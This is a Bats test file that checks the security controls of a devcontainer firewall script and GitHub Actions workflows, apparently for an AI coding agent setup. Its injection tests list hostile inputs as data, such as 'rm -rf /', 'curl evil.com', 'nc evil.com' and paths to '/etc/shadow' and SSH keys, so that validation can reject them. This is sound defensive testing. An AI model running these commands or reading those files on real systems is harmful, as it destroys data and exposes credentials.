#!/usr/bin/env bats

# Security penetration tests
# These tests attempt to break security controls

setup() {
  SCRIPT_DIR="${BATS_TEST_DIRNAME}/../../.devcontainer"
  TEST_TEMP_DIR="$(mktemp -d)"
  export TEST_TEMP_DIR
}

teardown() {
  if [ -n "$TEST_TEMP_DIR" ]; then
    rm -rf "$TEST_TEMP_DIR"
  fi
}

#
# Input Injection Tests
#

@test "security: CIDR injection with special characters" {
  # Try to inject shell commands via CIDR
  malicious_inputs=(
    "192.168.1.0/24; rm -rf /"
    "192.168.1.0/24 && curl evil.com"
    "192.168.1.0/24\`whoami\`"
    "192.168.1.0/24\$(whoami)"
    "192.168.1.0/24|nc evil.com"
  )

  for input in "${malicious_inputs[@]}"; do
    # Should be rejected by validation regex
    ! [[ "$input" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$ ]]
  done
}

@test "security: IP injection with special characters" {
  malicious_inputs=(
    "192.168.1.1; rm -rf /"
    "192.168.1.1\`whoami\`"
    "192.168.1.1\$(curl evil.com)"
    "192.168.1.1|bash"
    "192.168.1.1&& wget evil.com"
  )

  for input in "${malicious_inputs[@]}"; do
    ! [[ "$input" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
  done
}

@test "security: script rejects malformed JSON from GitHub API" {
  # Test that script validates JSON structure
  grep -q "jq -e '\.web and \.api and \.git'" "$SCRIPT_DIR/init-firewall.sh"
}

@test "security: script validates all external inputs" {
  # Verify script has validation for:
  # 1. GitHub API response
  grep -q 'if \[ -z "\$gh_ranges" \]' "$SCRIPT_DIR/init-firewall.sh"

  # 2. CIDR ranges
  grep -q "Invalid CIDR range" "$SCRIPT_DIR/init-firewall.sh"

  # 3. IP addresses
  grep -q "Invalid IP from DNS" "$SCRIPT_DIR/init-firewall.sh"

  # 4. DNS resolution
  grep -q 'if \[ -z "\$ips" \]' "$SCRIPT_DIR/init-firewall.sh"

  # 5. Host IP detection
  grep -q 'if \[ -z "\$HOST_IP" \]' "$SCRIPT_DIR/init-firewall.sh"
}

#
# Path Traversal Tests
#

@test "security: prompt file path traversal prevented" {
  # Try path traversal in prompt_file parameter
  malicious_paths=(
    "../../../etc/passwd"
    "../../.ssh/id_rsa"
    "/etc/shadow"
    "../../../../root/.bashrc"
  )

  # In a real action, these would be validated
  # We test that the validation logic exists
  ACTION_FILE=".github/actions/claude-code-action/action.yml"

  # Check that file existence is validated
  grep -q 'if \[ ! -f' "$ACTION_FILE"
}

#
# Environment Variable Injection
#

@test "security: environment variables are quoted in workflows" {
  # Check that all env var uses are properly quoted
  for workflow in .github/workflows/*.yml; do
    # Variables should be used with quotes: "${{ ... }}"
    # Not bare: ${{ ... }}

    # Check for potentially dangerous unquoted variables in run blocks
    ! grep -E 'run:.*\$\{\{.*\}\}[^"]' "$workflow" || true
  done
}

@test "security: no hardcoded secrets in repository" {
  # Check for common secret patterns
  ! grep -r "AKIA[0-9A-Z]\{16\}" \
    --exclude-dir=.git \
    --exclude-dir=node_modules \
    --exclude-dir=tests \
    . || true

  ! grep -r "sk-[a-zA-Z0-9]\{32,\}" \
    --exclude-dir=.git \
    --exclude-dir=node_modules \
    --exclude-dir=tests \
    . || true
}

@test "security: API keys are passed via secrets" {
  for workflow in .github/workflows/*.yml; do
    # API keys should come from secrets
    if grep -q "anthropic_api_key" "$workflow"; then
      grep -q "secrets.ANTHROPIC_API_KEY" "$workflow"
    fi
  done
}

#
# Command Injection Tests
#

@test "security: curl commands use safe options" {
  # Verify curl commands have timeouts and proper error handling
  grep -A2 "curl" "$SCRIPT_DIR/init-firewall.sh" | grep -q "connect-timeout"
}

@test "security: no eval or dynamic code execution" {
  # Script should not use eval
  ! grep -q "eval" "$SCRIPT_DIR/init-firewall.sh"

  # No source of untrusted files
  ! grep -E "source \$" "$SCRIPT_DIR/init-firewall.sh"
}

@test "security: all variables are quoted" {
  # Check for unquoted variable expansions that could lead to injection
  # This is a basic check; shellcheck provides more comprehensive analysis

  # Examples of what we're looking for:
  # BAD: echo $var
  # GOOD: echo "$var"

  # Note: This is checked by shellcheck, which is run separately
  # Here we just verify shellcheck is configured
  [ -f "package.json" ]
  grep -q "shellcheck" "package.json"
}

#
# Privilege Escalation Tests
#

@test "security: script does not require root privileges unnecessarily" {
  # Script should handle CAP_NET_ADMIN, not full root
  # Check for proper capability handling

  # Should NOT use sudo internally
  ! grep -q "sudo " "$SCRIPT_DIR/init-firewall.sh"
}

@test "security: file permissions are not overly permissive" {
  # Check that scripts are not world-writable
  for script in "$SCRIPT_DIR"/*.sh; do
    perms=$(stat -c %a "$script" 2>/dev/null || stat -f %Lp "$script")
    # Should not be writable by others (last digit should be 0, 1, 4, or 5)
    [[ "${perms: -1}" =~ ^[0145]$ ]]
  done
}

#
# Denial of Service Tests
#

@test "security: script has timeout protection" {
  # Verify curl commands have timeouts
  curl_count=$(grep -c "curl.*--connect-timeout" "$SCRIPT_DIR/init-firewall.sh" || echo "0")
  [ "$curl_count" -gt 0 ]
}

@test "security: script limits resource consumption" {
  # Check that script doesn't have infinite loops without limits
  # This is validated by shellcheck's SC2050, SC2194, etc.

  # Verify script has 'set -e' to fail fast
  grep -q "set -e" "$SCRIPT_DIR/init-firewall.sh"
}

@test "security: workflow jobs have timeout limits" {
  # Check that workflows define timeouts
  grep -q "timeout-minutes:" .github/workflows/claude-issue-triage.yml
}

#
# Data Exfiltration Prevention
#

@test "security: no unauthorized network connections in firewall" {
  # Verify firewall blocks unknown domains
  grep -q "example.com" "$SCRIPT_DIR/init-firewall.sh"

  # Verify default policy is DROP
  grep -q "iptables -P OUTPUT DROP" "$SCRIPT_DIR/init-firewall.sh"
}

@test "security: allowed domains are explicitly listed" {
  # Verify allowlist approach (not blocklist)
  grep -q "allowed-domains" "$SCRIPT_DIR/init-firewall.sh"

  # Check for expected domains
  grep -q "api.anthropic.com" "$SCRIPT_DIR/init-firewall.sh"
  grep -q "github.com/meta" "$SCRIPT_DIR/init-firewall.sh"
  grep -q "registry.npmjs.org" "$SCRIPT_DIR/init-firewall.sh"
}

#
# Workflow Security Tests
#

@test "security: workflows use pinned action versions" {
  for workflow in .github/workflows/*.yml; do
    # Actions should use @v4, @sha-xxx, not @main/@master
    ! grep -E "uses:.*@(main|master|latest)" "$workflow"
  done
}

@test "security: workflows have minimal permissions" {
  # Check that workflows specify permissions (not use default)
  for workflow in .github/workflows/*.yml; do
    if grep -q "jobs:" "$workflow"; then
      # Should have permissions defined somewhere
      grep -q "permissions:" "$workflow" || {
        echo "WARNING: $workflow may not have explicit permissions"
      }
    fi
  done
}

@test "security: composite actions validate all inputs" {
  ACTION_FILE=".github/actions/claude-code-action/action.yml"

  # Should validate prompt is not empty
  grep -q 'if \[ ! -s' "$ACTION_FILE"

  # Should validate file exists
  grep -q 'if \[ ! -f' "$ACTION_FILE"
}

@test "security: issue triage action has restricted tools" {
  ACTION_FILE=".github/actions/claude-issue-triage-action/action.yml"

  # Should have explicit tool allowlist
  grep -q "allowed_tools:" "$ACTION_FILE"

  # Should NOT allow dangerous tools
  ! grep -q "Write" "$ACTION_FILE" || ! grep -A5 "allowed_tools:" "$ACTION_FILE" | grep -q "Write"
  ! grep -q "Edit" "$ACTION_FILE" || ! grep -A5 "allowed_tools:" "$ACTION_FILE" | grep -q "Edit"
}

#
# Cryptographic Security
#

@test "security: docker images are signed" {
  WORKFLOW=".github/workflows/docker-publish.yml"

  # Verify cosign is used for signing
  grep -q "cosign" "$WORKFLOW"
  grep -q "sigstore" "$WORKFLOW"
}

@test "security: HTTPS is enforced" {
  # All external URLs should use HTTPS
  for file in .github/**/*.yml .devcontainer/*.sh; do
    if [ -f "$file" ]; then
      # If file contains HTTP URLs, they should be HTTPS
      ! grep -E "http://(?!localhost|127\.0\.0\.1)" "$file" || {
        # It's ok for localhost
        grep -E "http://(localhost|127\.0\.0\.1)" "$file"
      }
    fi
  done
}

#
# Audit Logging
#

@test "security: workflows log security-relevant actions" {
  # Check that important steps have names for audit trail
  for workflow in .github/workflows/*.yml; do
    # Each step should have a name
    step_count=$(grep -c "^      - " "$workflow" || echo "0")
    name_count=$(grep -c "name:" "$workflow" || echo "0")

    # Most steps should have names (some may be one-liners)
    if [ "$step_count" -gt 0 ]; then
      [ "$name_count" -gt $((step_count / 2)) ]
    fi
  done
}
